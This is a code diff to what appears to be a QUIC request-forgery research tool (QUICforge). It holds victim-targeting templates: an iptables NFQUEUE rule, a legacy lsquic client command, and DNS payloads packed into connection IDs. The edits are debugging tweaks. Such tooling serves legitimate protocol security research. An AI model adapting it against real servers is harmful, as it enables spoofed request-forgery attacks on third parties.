@@ -10,6 +10,7 @@ import ssl
 import argparse
 from argparse import RawTextHelpFormatter
 from multiprocessing import Process
+import traceback
 
 import aioquic
 from aioquic.asyncio.client import connect
@@ -49,7 +50,7 @@ SPOOFED_COUNT = 0
 iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
 
 # Legacy Lsquic support, adjust to the correct install path
-lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K -o scid_len=20"
+lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
 lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
 lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN
 
@@ -171,11 +172,13 @@ def configure_client(args):
     version = 'VNRF' if args.mode == "vn" else "VERSION_1"
     cid_len = args.cid_len if "cid_len" in args else 20
 
-    init_dcid = b"A" * cid_len,
-    init_scid = b"B" * cid_len,
+    #init_dcid = b"A" * cid_len
+    #init_scid = b"B" * cid_len
+    init_dcid = os.urandom(cid_len)
+    init_scid = os.urandom(cid_len)
     if args.mode == 'vn' and args.payload_mode != None:
         if args.payload_mode == "dns":
-            init_dcid, init_scid = vp_dns.create_payload(args.payload)
+            init_dcid,init_scid = vp_dns.create_payload(args.payload)
 
     configuration = QuicConfiguration(
         is_client=True, 
@@ -193,11 +196,12 @@ def configure_client(args):
 
 def configure_legacy_client(args):
     cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
-    if args.version and args.version != '1':
-        cmd += lsquic_client_flag_version.format(version=args.version)     
-    if args.alpn and args.alpn != '':
-        cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
+    #if args.version and args.version != '1':
+    #    cmd += lsquic_client_flag_version.format(version=args.version)     
+    #if args.alpn and args.alpn != '':
+    #    cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
     
+    print(cmd)
     return cmd
 
 
@@ -253,6 +257,7 @@ def main():
     except Exception as e:
         print("[!] Something went wrong!")
         print(e)
+        print(traceback.format_exc())
     
     print("\n[+] Cleaning up")     
     print("[-] Terminating Client(s)")
